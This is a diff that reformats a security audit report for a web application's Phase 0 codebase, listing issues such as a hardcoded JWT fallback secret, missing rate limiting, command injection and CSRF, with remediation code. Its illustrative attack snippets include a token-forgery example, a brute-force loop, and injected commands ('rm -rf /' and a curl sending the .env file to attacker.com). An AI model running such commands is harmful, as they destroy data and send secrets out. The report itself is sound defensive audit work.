@@ -1,8 +1,7 @@
 # Security Audit Report - Phase 0
 
-**Date:** November 26, 2025
-**Severity Level:** 1 CRITICAL, 3 HIGH, 4 MEDIUM
-**Status:** ACTION REQUIRED BEFORE PRODUCTION
+**Date:** November 26, 2025 **Severity Level:** 1 CRITICAL, 3 HIGH, 4 MEDIUM **Status:** ACTION
+REQUIRED BEFORE PRODUCTION
 
 ---
 
@@ -19,9 +18,12 @@
 
 ## Executive Summary
 
-The Phase 0 codebase contains **1 CRITICAL** security vulnerability that could lead to complete authentication bypass if deployed to production. Additional HIGH severity issues around rate limiting, CSRF, and input validation were identified.
+The Phase 0 codebase contains **1 CRITICAL** security vulnerability that could lead to complete
+authentication bypass if deployed to production. Additional HIGH severity issues around rate
+limiting, CSRF, and input validation were identified.
 
-**RECOMMENDATION:** Do not deploy to production until CRITICAL and HIGH severity issues are remediated.
+**RECOMMENDATION:** Do not deploy to production until CRITICAL and HIGH severity issues are
+remediated.
 
 ### Risk Score: 8.2/10 (Requires Immediate Attention)
 
@@ -31,13 +33,13 @@ The Phase 0 codebase contains **1 CRITICAL** security vulnerability that could l
 
 ### CVE-EQUIVALENT: Hardcoded JWT Secret with Development Fallback
 
-**ID:** SECURITY-001-CRITICAL
-**CVSS Score:** 9.1 (Critical)
-**CWE:** CWE-798 (Use of Hard-Coded Credentials)
+**ID:** SECURITY-001-CRITICAL **CVSS Score:** 9.1 (Critical) **CWE:** CWE-798 (Use of Hard-Coded
+Credentials)
 
 #### Vulnerability Details
 
 **Location:** Three API routes
+
 ```
 1. /packages/@wundr/neolith/apps/web/app/api/daemon/messages/route.ts
 2. /packages/@wundr/neolith/apps/web/app/api/daemon/config/route.ts
@@ -45,6 +47,7 @@ The Phase 0 codebase contains **1 CRITICAL** security vulnerability that could l
 ```
 
 **Vulnerable Code:**
+
 ```typescript
 const JWT_SECRET = process.env.DAEMON_JWT_SECRET || 'daemon-secret-change-in-production';
 ```
@@ -57,6 +60,7 @@ const JWT_SECRET = process.env.DAEMON_JWT_SECRET || 'daemon-secret-change-in-pro
    - No authentication is actually enforced
 
 2. **Token Forgery Attack:**
+
    ```typescript
    import jwt from 'jsonwebtoken';
 
@@ -68,7 +72,7 @@ const JWT_SECRET = process.env.DAEMON_JWT_SECRET || 'daemon-secret-change-in-pro
 
    // Can impersonate any VP or perform any action
    fetch('/api/daemon/messages', {
-     headers: { 'Authorization': `Bearer ${token}` }
+     headers: { Authorization: `Bearer ${token}` },
    });
    ```
 
@@ -81,12 +85,12 @@ const JWT_SECRET = process.env.DAEMON_JWT_SECRET || 'daemon-secret-change-in-pro
 
 #### Risk Assessment
 
-| Factor | Rating | Details |
-|---|---|---|
-| Exploitability | VERY HIGH | No expertise needed, code is public |
-| Impact | CRITICAL | Complete auth bypass, system compromise |
+| Factor          | Rating    | Details                                    |
+| --------------- | --------- | ------------------------------------------ |
+| Exploitability  | VERY HIGH | No expertise needed, code is public        |
+| Impact          | CRITICAL  | Complete auth bypass, system compromise    |
 | Discoverability | VERY HIGH | Appears in source code, deployed artifacts |
-| Affected Users | ALL | Every user's daemon could be compromised |
+| Affected Users  | ALL       | Every user's daemon could be compromised   |
 
 #### Immediate Remediation
 
@@ -127,7 +131,7 @@ function verifyDaemonToken(token: string): Payload {
   } catch (error) {
     logger.warn('Invalid daemon token attempt', {
       error: error instanceof Error ? error.message : 'Unknown',
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
     });
     throw new Error('Invalid or expired token');
   }
@@ -150,6 +154,7 @@ DAEMON_JWT_SECRET=<use-secure-random-here>
 **STEP 5: Token Rotation**
 
 If system deployed with old secret:
+
 ```typescript
 // Support old and new tokens temporarily
 function verifyDaemonTokenWithRotation(token: string): Payload {
@@ -193,15 +198,15 @@ curl -X GET http://localhost:3000/api/daemon/config \
 
 ### SECURITY-002-HIGH: Missing Rate Limiting on All API Endpoints
 
-**ID:** SECURITY-002-HIGH
-**CVSS Score:** 7.5 (High)
-**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
+**ID:** SECURITY-002-HIGH **CVSS Score:** 7.5 (High) **CWE:** CWE-770 (Allocation of Resources
+Without Limits or Throttling)
 
 #### Vulnerability Description
 
 No rate limiting is implemented on any API endpoint. Attackers can:
 
 1. **Brute Force Authentication**
+
    ```bash
    # Try 10,000 password combinations per second
    for i in {1..10000}; do
@@ -211,6 +216,7 @@ No rate limiting is implemented on any API endpoint. Attackers can:
    ```
 
 2. **DDoS Attack**
+
    ```bash
    # Flood database with queries
    ab -n 100000 -c 1000 http://localhost:3000/api/vps
@@ -223,11 +229,11 @@ No rate limiting is implemented on any API endpoint. Attackers can:
 
 #### Affected Endpoints (ALL)
 
-- /api/auth/* (Authentication)
-- /api/vps/* (VP management)
-- /api/tasks/* (Task operations)
-- /api/notifications/* (Notifications)
-- /api/daemon/* (Daemon operations)
+- /api/auth/\* (Authentication)
+- /api/vps/\* (VP management)
+- /api/tasks/\* (Task operations)
+- /api/notifications/\* (Notifications)
+- /api/daemon/\* (Daemon operations)
 
 #### Remediation
 
@@ -325,13 +331,13 @@ export async function POST(request: NextRequest) {
 
 #### Recommended Limits
 
-| Endpoint | Limit | Window | Rationale |
-|---|---|---|---|
-| /api/auth/signin | 5 attempts | 15 minutes | Prevent brute force |
-| /api/auth/register | 3 attempts | 1 hour | Prevent spam signups |
-| /api/vps/* | 100 requests | 1 hour | Normal user usage |
-| /api/daemon/* | 1000 requests | 1 hour | Daemon frequent polling |
-| /api/notifications/* | 50 requests | 1 hour | Background polling |
+| Endpoint              | Limit         | Window     | Rationale               |
+| --------------------- | ------------- | ---------- | ----------------------- |
+| /api/auth/signin      | 5 attempts    | 15 minutes | Prevent brute force     |
+| /api/auth/register    | 3 attempts    | 1 hour     | Prevent spam signups    |
+| /api/vps/\*           | 100 requests  | 1 hour     | Normal user usage       |
+| /api/daemon/\*        | 1000 requests | 1 hour     | Daemon frequent polling |
+| /api/notifications/\* | 50 requests   | 1 hour     | Background polling      |
 
 #### Monitoring
 
@@ -349,9 +355,8 @@ logger.warn('Rate limit exceeded', {
 
 ### SECURITY-003-HIGH: Unvalidated Command Execution in Migration Service
 
-**ID:** SECURITY-003-HIGH
-**CVSS Score:** 8.6 (High)
-**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
+**ID:** SECURITY-003-HIGH **CVSS Score:** 8.6 (High) **CWE:** CWE-78 (Improper Neutralization of
+Special Elements used in an OS Command)
 
 #### Vulnerability Description
 
@@ -377,18 +382,18 @@ If `command` parameter is ever user-controlled:
 
 ```typescript
 // Attacker could do:
-executePrismaCommand('migrate deploy; rm -rf /')
+executePrismaCommand('migrate deploy; rm -rf /');
 
 // Or:
-executePrismaCommand('migrate deploy && curl attacker.com/exfil?data=$(cat .env)')
+executePrismaCommand('migrate deploy && curl attacker.com/exfil?data=$(cat .env)');
 
 // Results in execution of arbitrary shell commands
 ```
 
 #### Risk Assessment
 
-**Current State:** MEDIUM (low likelihood if only called internally)
-**If APIs expose:** HIGH (very likely if user input reaches this)
+**Current State:** MEDIUM (low likelihood if only called internally) **If APIs expose:** HIGH (very
+likely if user input reaches this)
 
 #### Remediation
 
@@ -427,19 +432,19 @@ async function executePrismaCommand(
     let stdout = '';
     let stderr = '';
 
-    child.stdout?.on('data', (data) => {
+    child.stdout?.on('data', data => {
       stdout += data.toString();
     });
 
-    child.stderr?.on('data', (data) => {
+    child.stderr?.on('data', data => {
       stderr += data.toString();
     });
 
-    child.on('error', (error) => {
+    child.on('error', error => {
       reject(new MigrationError(`Failed to execute command`, stderr, stdout));
     });
 
-    child.on('close', (code) => {
+    child.on('close', code => {
       if (code !== 0) {
         reject(new MigrationError(`Command failed with code ${code}`, stderr, stdout));
       } else {
@@ -454,21 +459,21 @@ async function executePrismaCommand(
 
 ### SECURITY-004-HIGH: Missing CSRF Protection Verification
 
-**ID:** SECURITY-004-HIGH
-**CVSS Score:** 7.5 (High)
-**CWE:** CWE-352 (Cross-Site Request Forgery)
+**ID:** SECURITY-004-HIGH **CVSS Score:** 7.5 (High) **CWE:** CWE-352 (Cross-Site Request Forgery)
 
 #### Vulnerability Description
 
-POST/PUT/DELETE endpoints don't explicitly validate CSRF tokens. While NextAuth provides CSRF protection, it's not explicitly verified in route handlers.
+POST/PUT/DELETE endpoints don't explicitly validate CSRF tokens. While NextAuth provides CSRF
+protection, it's not explicitly verified in route handlers.
 
 #### Affected Routes
 
 All POST/PUT/DELETE routes:
+
 - /api/vps/bulk
-- /api/daemon/*
-- /api/tasks/*
-- /api/organizations/*
+- /api/daemon/\*
+- /api/tasks/\*
+- /api/organizations/\*
 
 #### Remediation
 
@@ -524,9 +529,8 @@ module.exports = {
 
 ### SECURITY-005-MEDIUM: Missing Environment Variable Validation
 
-**ID:** SECURITY-005-MEDIUM
-**CVSS Score:** 5.3 (Medium)
-**CWE:** CWE-1025 (Comparison Using Wrong Factors)
+**ID:** SECURITY-005-MEDIUM **CVSS Score:** 5.3 (Medium) **CWE:** CWE-1025 (Comparison Using Wrong
+Factors)
 
 #### Issue
 
@@ -540,6 +544,7 @@ const apiKey = process.env.LIVEKIT_API_KEY;
 ```
 
 If not set:
+
 - Code may behave unexpectedly
 - May fall back to default values not suitable for production
 - Runtime errors instead of startup errors
@@ -550,12 +555,7 @@ Create environment validation at startup:
 
 ```typescript
 // lib/env.ts
-const requiredEnvVars = [
-  'DATABASE_URL',
-  'NEXTAUTH_SECRET',
-  'NEXTAUTH_URL',
-  'DAEMON_JWT_SECRET',
-];
+const requiredEnvVars = ['DATABASE_URL', 'NEXTAUTH_SECRET', 'NEXTAUTH_URL', 'DAEMON_JWT_SECRET'];
 
 const optionalEnvVars = {
   CDN_DOMAIN: 'cdn.example.com',
@@ -616,9 +616,8 @@ validateEnv();
 
 ### SECURITY-006-MEDIUM: Silent Error Suppression in Storage Operations
 
-**ID:** SECURITY-006-MEDIUM
-**CVSS Score:** 5.7 (Medium)
-**CWE:** CWE-391 (Unchecked Error Condition)
+**ID:** SECURITY-006-MEDIUM **CVSS Score:** 5.7 (Medium) **CWE:** CWE-391 (Unchecked Error
+Condition)
 
 #### Issue
 
@@ -651,7 +650,7 @@ try {
       parsed.map((a: QueuedAction) => ({
         ...a,
         createdAt: new Date(a.createdAt),
-      })),
+      }))
     );
   }
 } catch (err) {
@@ -679,9 +678,7 @@ try {
 
 ### SECURITY-007-MEDIUM: No Timeout on Fetch Requests
 
-**ID:** SECURITY-007-MEDIUM
-**CVSS Score:** 5.3 (Medium)
-**CWE:** CWE-561 (Dead Code)
+**ID:** SECURITY-007-MEDIUM **CVSS Score:** 5.3 (Medium) **CWE:** CWE-561 (Dead Code)
 
 #### Issue
 
@@ -878,9 +875,7 @@ node -r dotenv/config lib/env.ts
 
 ## Sign-Off
 
-**Auditor:** Security Review Team
-**Date:** November 26, 2025
-**Status:** ACTION REQUIRED
+**Auditor:** Security Review Team **Date:** November 26, 2025 **Status:** ACTION REQUIRED
 
 **Next Review:** After remediation of CRITICAL and HIGH severity issues
 
